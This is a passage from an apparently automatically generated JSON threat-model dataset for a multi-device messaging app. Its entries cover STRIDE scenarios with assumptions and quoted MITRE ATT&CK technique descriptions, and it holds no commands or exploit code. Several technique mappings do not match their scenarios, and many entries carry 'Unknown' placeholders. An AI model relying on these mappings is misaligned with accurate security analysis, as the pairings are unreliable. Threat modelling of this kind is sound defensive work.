                    "Assumption": "Attackers can access the device storing the SQLite database.",
                    "Role": "Attacker",
                    "Condition": "Physical access or remote vulnerabilities are not adequately mitigated."
                },
                {
                    "Assumption": "No integrity checks on database entries.",
                    "Role": "System",
                    "Condition": "System does not periodically verify database integrity."
                }
            ],
            "Potential Impact": "Data integrity and potentially confidentiality is compromised due to unauthorized changes to messages and credentials.",
            "MITRE ATT&CK Keywords": [
                "database tampering",
                "data integrity",
                "credential manipulation",
                "SQLite"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits vulnerabilities in the encryption protocol implementation to alter the encryption keys.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities exist within the encryption protocol implementation.",
                    "Role": "Developer",
                    "Condition": "Incomplete or flawed encryption protocol implementation."
                },
                {
                    "Assumption": "Attackers are aware of and can exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Publicly known or discovered security flaws."
                },
                {
                    "Assumption": "No patching or updates are applied to fix known vulnerabilities.",
                    "Role": "System",
                    "Condition": "System lacks timely updates and patching practices."
                }
            ],
            "Potential Impact": "Integrity and confidentiality are compromised, potentially leading to complete decryption of communications.",
            "MITRE ATT&CK Keywords": [
                "encryption tampering",
                "protocol vulnerability",
                "key manipulation",
                "cipher weak points"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending messages by claiming their device was compromised or the messages were forged.",
            "Assumptions": [
                {
                    "Assumption": "System lacks non-repudiation mechanisms to verify message origins.",
                    "Role": "System",
                    "Condition": "No digital signatures or logging mechanisms for message attribution."
                },
                {
                    "Assumption": "Users can argue plausible deniability due to insufficient evidence.",
                    "Role": "User",
                    "Condition": "System does not maintain logs that are tamper-proof."
                },
                {
                    "Assumption": "No independent verification of the claimed device compromise.",
                    "Role": "IT support",
                    "Condition": "Lack of forensic capabilities to verify device integrity."
                }
            ],
            "Potential Impact": "Repudiation can undermine trust and accountability, potentially leading to disputes or misuse of the messaging system.",
            "MITRE ATT&CK Keywords": [
                "message repudiation",
                "non-repudiation",
                "digital forensics",
                "logging deficiency"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes or modifies logs to remove traces of their actions, enabling deniability of malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "Logs are accessible and can be modified or deleted by attackers.",
                    "Role": "Attacker",
                    "Condition": "Insufficient logging protection or access controls."
                },
                {
                    "Assumption": "No mechanisms to verify log integrity or detect tampering.",
                    "Role": "System",
                    "Condition": "Logs are not tamper-evident or monitored."
                },
                {
                    "Assumption": "Attackers have the necessary privileges to modify or delete logs.",
                    "Role": "Attacker",
                    "Condition": "Privilege elevation or misconfigurations allow unauthorized log access."
                }
            ],
            "Potential Impact": "Unauthorized actions are not traceable, reducing system accountability and detection of malicious activities.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "repudiation",
                "privilege escalation",
                "access control"
            ],
            "mitre_technique": {
                "name": "Direct Volume Access",
                "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
                "id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
                "technique_id": "T1006"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user disputes a transaction or communication interaction, claiming it did not originate from their account.",
            "Assumptions": [
                {
                    "Assumption": "System lacks robust transaction logging.",
                    "Role": "System",
                    "Condition": "Logs do not capture sufficient details to verify transaction origins."
                },
                {
                    "Assumption": "Users can deny transactions due to lack of digital signing or multi-factor authentication.",
                    "Role": "User",
                    "Condition": "System does not employ strong authentication mechanisms per transaction."
                },
                {
                    "Assumption": "Monitoring mechanisms are insufficient to detect and alert unusual activities.",
                    "Role": "System",
                    "Condition": "Anomaly detection is not implemented."
                }
            ],
            "Potential Impact": "Repudiation can lead to financial disputes and loss of trust in the application\u2019s integrity.",
            "MITRE ATT&CK Keywords": [
                "transaction repudiation",
                "dispute resolution",
                "multi-factor authentication",
                "logging"
            ],
            "mitre_technique": {
                "name": "Web Portal Capture",
                "description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)",
                "id": "attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e",
                "technique_id": "T1056.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted traffic between the primary and companion devices.",
            "Assumptions": [
                {
                    "Assumption": "Unencrypted traffic is used for certain communications.",
                    "Role": "System",
                    "Condition": "Some data is transmitted without encryption due to oversight or design choices."
                },
                {
                    "Assumption": "Attackers can position themselves between the devices to intercept traffic.",
                    "Role": "Attacker",
                    "Condition": "Network vulnerabilities or physical access facilitate MITM attacks."
                },
                {
                    "Assumption": "No encryption at higher layers.",
                    "Role": "System",
                    "Condition": "Lack of end-to-end encryption for some types of data."
                }
            ],
            "Potential Impact": "Sensitive information is disclosed, potentially compromising user privacy.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network interception",
                "unencrypted traffic",
                "privacy breach"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "SQLite databases on the device are accessed due to insufficient encryption, exposing message histories and authentication credentials.",
            "Assumptions": [
                {
                    "Assumption": "SQLite databases are not fully encrypted or protected.",
                    "Role": "System",
                    "Condition": "Encryption is not applied to database storage or is poorly implemented."
                },
                {
                    "Assumption": "Attackers can gain access to the device storing the database.",
                    "Role": "Attacker",
                    "Condition": "Device security is compromised, leading to unauthorized access."
                },
                {
                    "Assumption": "No logging or detection mechanisms monitor database access.",
                    "Role": "System",
                    "Condition": "Absence of robust monitoring for unusual database activities."
                }
            ],
            "Potential Impact": "Confidentiality of stored data is compromised, exposing sensitive user information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "database encryption",
                "credential exposure",
                "SQLite"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider with legitimate access to companion devices exfiltrates sensitive message contents.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have privileged access to companion devices.",
                    "Role": "Insider",
                    "Condition": "Privileged users are granted broad access."
                },
                {
                    "Assumption": "Companion devices store sensitive data in plaintext or insufficiently protected formats.",
                    "Role": "System",
                    "Condition": "Weak data-at-rest protection on companion devices."
                },
                {
                    "Assumption": "No insider threat detection mechanisms are in place.",
                    "Role": "System",
                    "Condition": "Lack of monitoring and alerting for insider activities."
                }
            ],
            "Potential Impact": "Sensitive information is disclosed, leading to potential exploitation or leaks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "insider threat",
                "data exfiltration",
                "companion device"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the server with excessive requests, overwhelming the system and making it unavailable to users.",
            "Assumptions": [
                {
                    "Assumption": "System is vulnerable to high-volume traffic.",
                    "Role": "System",
                    "Condition": "No adequate rate limiting or load balancing."
                },
                {
                    "Assumption": "Attackers can generate a high volume of traffic against the server.",
                    "Role": "Attacker",
                    "Condition": "Access to botnets or other means to launch high-volume attacks."
                },
                {
                    "Assumption": "No DDoS protection mechanisms are implemented.",
                    "Role": "System",
                    "Condition": "Lack of DDoS mitigation tools or services."
                }
            ],
            "Potential Impact": "Availability of the messaging service is compromised, leading to an inability for users to send or receive messages.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "flood attack",
                "server overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the encryption protocol to crash the messaging application, disrupting user access.",
            "Assumptions": [
                {
                    "Assumption": "The encryption protocol has vulnerabilities that can be exploited.",
                    "Role": "Developer",
                    "Condition": "Flaws in the encryption implementation or logic."
                },
                {
                    "Assumption": "Attackers have identified and can trigger the vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of existing vulnerabilities and means to exploit them."
                },
                {
                    "Assumption": "No automatic recovery or mitigation for protocol-based crashes.",
                    "Role": "System",
                    "Condition": "System lacks resilience against protocol-specific attacks."
                }
            ],
            "Potential Impact": "Availability of the application is compromised, temporarily preventing users from accessing their messages.",
            "MITRE ATT&CK Keywords": [
                "encryption protocol",
                "application crash",
                "service disruption",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker gains access to a companion device and continuously sends malformed messages, disrupting the synchronization and communication processes.",
            "Assumptions": [
                {
                    "Assumption": "Companion devices can send messages without proper validation.",
                    "Role": "System",
                    "Condition": "System lacks input validation and sanitization at multiple points."
                },
                {
                    "Assumption": "Attackers have compromised a companion device.",
                    "Role": "Attacker",
                    "Condition": "Device security is insufficient, allowing unauthorized access."
                },
                {
                    "Assumption": "No monitoring for abnormal message patterns.",
                    "Role": "System",
                    "Condition": "Absence of anomaly detection and response mechanisms."
                }
            ],
            "Potential Impact": "Availability and reliability of messaging services are affected, causing interruptions and synchronization issues.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "companion device",
                "malformed messages",
                "synchronization disruption"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the mobile application to gain root privileges on the device.",
            "Assumptions": [
                {
                    "Assumption": "The mobile application contains exploitable vulnerabilities.",
                    "Role": "Developer",
                    "Condition": "Lack of secure coding practices and vulnerability assessments."
                },
                {
                    "Assumption": "Attackers have identified these vulnerabilities and can exploit them.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of the application structure and existing weak points."
                },
                {
                    "Assumption": "Root access is not properly restricted or monitored.",
                    "Role": "System",
                    "Condition": "System does not enforce strict privilege management or monitor high privilege actions."
                }
            ],
            "Potential Impact": "Complete compromise of the device, leading to access and manipulation of all data stored on the device.",
            "MITRE ATT&CK Keywords": [
                "root privilege",
                "mobile application",
                "vulnerability exploitation",
                "device compromise"
            ],
            "mitre_technique": {
                "name": "Elevated Execution with Prompt",
                "description": "Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating.  This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\n\nAdversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)",
                "id": "attack-pattern--101c3a64-9ba5-46c9-b573-5c501053cbca",
                "technique_id": "T1514"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a code injection vulnerability in the desktop client to execute arbitrary commands with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "The desktop client has a code injection vulnerability.",
                    "Role": "Developer",
                    "Condition": "Poor input sanitization and secure coding practices."
                },
                {
                    "Assumption": "Attackers can identify and exploit this vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Access to tools and knowledge for exploiting code injection vulnerabilities."
                },
                {
                    "Assumption": "No mechanisms prevent or alert on arbitrary command execution.",
                    "Role": "System",
                    "Condition": "System lacks strict execution policies and monitoring."
                }
            ],
            "Potential Impact": "Elevation of privileges can lead to broader system compromise and unauthorized access to sensitive information.",
            "MITRE ATT&CK Keywords": [
                "code injection",
                "elevation of privilege",
                "desktop client",
                "arbitrary code execution"
            ],
            "mitre_technique": {
                "name": "Reflective Code Loading",
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",
                "id": "attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a",
                "technique_id": "T1620"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering to trick a user into installing malicious software that grants the attacker elevated privileges on the companion device.",
            "Assumptions": [
                {
                    "Assumption": "Users can be manipulated through social engineering tactics.",
                    "Role": "User",
                    "Condition": "Lack of security awareness and training."
                },
                {
                    "Assumption": "Attackers can create convincing malicious software.",
                    "Role": "Attacker",
                    "Condition": "Skills and tools for developing and distributing malware."
                },
                {
                    "Assumption": "System does not strictly control software installations or monitor for unusual installations.",
                    "Role": "System",
                    "Condition": "Inadequate endpoint protection and software management policies."
                }
            ],
            "Potential Impact": "Privilege escalation through malicious software can lead to unauthorized actions and access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "malicious software",
                "elevation of privilege",
                "companion device"
            ],
            "mitre_technique": {
                "name": "Elevated Execution with Prompt",
                "description": "Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating.  This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\n\nAdversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)",
                "id": "attack-pattern--101c3a64-9ba5-46c9-b573-5c501053cbca",
                "technique_id": "T1514"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "21",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake companion device to impersonate a legitimate user in the messaging application.",
            "Assumptions": [
                {
                    "Assumption": "The fake device's public key is successfully registered as a companion device.",
                    "Role": "Attacker",
                    "Condition": "Attacker has access to the primary device or exploits a vulnerability in the key exchange process"
                },
                {
                    "Assumption": "The primary device does not properly validate the legitimacy of the companion device's public key.",
                    "Role": "Application Developer",
                    "Condition": "Weakness or bug in the public key validation process"
                },
                {
                    "Assumption": "The attacker can generate or access an identity key pair that mimics the legitimate user.",
                    "Role": "Attacker",
                    "Condition": "Knowledge or access to cryptographic tools and techniques"
                }
            ],
            "Potential Impact": "Unauthorized access to messaging accounts, data confidentiality breach.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "network",
                "device",
                "credential access"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Phishing attack targeting user credentials during account setup on the primary device.",
            "Assumptions": [
                {
                    "Assumption": "Users are susceptible to social engineering attacks.",
                    "Role": "User",
                    "Condition": "Lack of awareness or training on phishing risks"
                },
                {
                    "Assumption": "Attacker can create convincing fake setup prompts or URLs.",
                    "Role": "Attacker",
                    "Condition": "Skill in creating phishing websites or messages"
                },
                {
                    "Assumption": "The messaging application does not enforce multi-factor authentication during setup.",
                    "Role": "Application Developer",
                    "Condition": "Absence of or weak implementation of additional verification steps"
                }
            ],
            "Potential Impact": "Unauthorized access to user accounts, data confidentiality breach.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "credentials",
                "account access",
                "social engineering"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Man-in-the-middle attack where the attacker intercepts and modifies the initial key exchange between devices.",
            "Assumptions": [
                {
                    "Assumption": "Communication channel between devices is not sufficiently secure.",
                    "Role": "Network Administrator",
                    "Condition": "Use of insecure protocols or networks"
                },
                {
                    "Assumption": "The attacker is able to position themselves on the same network as the victim.",
                    "Role": "Attacker",
                    "Condition": "Access to the same local or Wi-Fi network"
                },
                {
                    "Assumption": "Weakness in the key verification step that allows the acceptance of a malicious public key.",
                    "Role": "Application Developer",
                    "Condition": "Vulnerability in key exchange protocol"
                }
            ],
            "Potential Impact": "Compromised data integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "communications",
                "network",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious actor modifies the SQLite database on a companion device to access stored messages and credentials.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has local access to the desktop client.",
                    "Role": "Attacker",
                    "Condition": "Physical or remote access to the device"
                },
                {
                    "Assumption": "SQLite database is not adequately encrypted or protected.",
                    "Role": "Application Developer",
                    "Condition": "Lack of comprehensive encryption or access control measures"
                },
                {
                    "Assumption": "The application does not detect or prevent unauthorized database modifications.",
                    "Role": "Application Developer",
                    "Condition": "Absence of integrity checking mechanisms"
                }
            ],
            "Potential Impact": "Compromised data integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "database",
                "tampering",
                "encryption",
                "local access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Unauthorized modification of application binaries to bypass encryption or add malicious functionality.",
            "Assumptions": [
                {
                    "Assumption": "Attacker can alter the binary without detection.",
                    "Role": "Attacker",
                    "Condition": "Lack of binary integrity checks or code signing"
                },
                {
                    "Assumption": "Users download and use the tampered application.",
                    "Role": "User",
                    "Condition": "Downloading applications from untrusted sources or lack of verification"
                },
                {
                    "Assumption": "The application's distribution platform does not enforce strict checks on uploaded binaries.",
                    "Role": "Application Distributor",
                    "Condition": "Weakness or lack of gatekeeping in app stores or repositories"
                }
            ],
            "Potential Impact": "Compromised data confidentiality, integrity, and potential for privilege escalation.",
            "MITRE ATT&CK Keywords": [
                "binary tampering",
                "application",
                "distribution platform",
                "integrity checks"
            ],
            "mitre_technique": {
                "name": "Compromise Software Dependencies and Development Tools",
